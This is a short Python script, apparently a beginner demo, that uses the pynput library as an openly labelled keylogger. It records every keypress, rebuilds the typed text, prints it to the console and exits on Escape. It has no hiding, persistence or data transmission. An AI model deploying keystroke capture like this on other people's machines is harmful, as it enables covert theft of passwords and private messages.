from pynput import keyboard
from pynput.keyboard import Key, Listener

# Declare global variable text to store the key values
text = 'Welcome to keylogger'

# Define function onPress() with parameter key, to detect the key values on button press
def onPress(key):
    # Access text as global
    global text
    # Use keyboard.Key to compare the key pressed 
    # and accordingly append the characters to the text variable if its a special key
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.shift_r:
        pass
    elif key == keyboard.Key.cmd:
        pass
    elif key == keyboard.Key.cmd_r:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    # Return false if it is escape key
    elif key == keyboard.Key.esc:
        return False
    # Else do an explicit conversion from the key object to a string and then append that to the string text.
    else:
        text += str(key).strip("'")
    # print text    
    print(text)

# Define function onRelease() with one parameter key
def onRelease(key):
    # Check if key is escape key
    if key == Key.esc:
        # return False
        return False


# Create listeners to listen keyboard events that calls onPress and onRelease functions when on_press and on_release events occurs respectively
with Listener(on_press=onPress, on_release=onRelease) as listener:
    # Print "!!! WELCOME TO KEYLOGGER APP !!!"
    print("!!! WELCOME TO KEYLOGGER APP !!!")
    # Print "!!! APP IS READY TO LISTEN THE KEYS !!!"
    print("!!! APP IS READY TO LISTEN THE KEYS !!!")
    # Call join() method from listener
    listener.join()
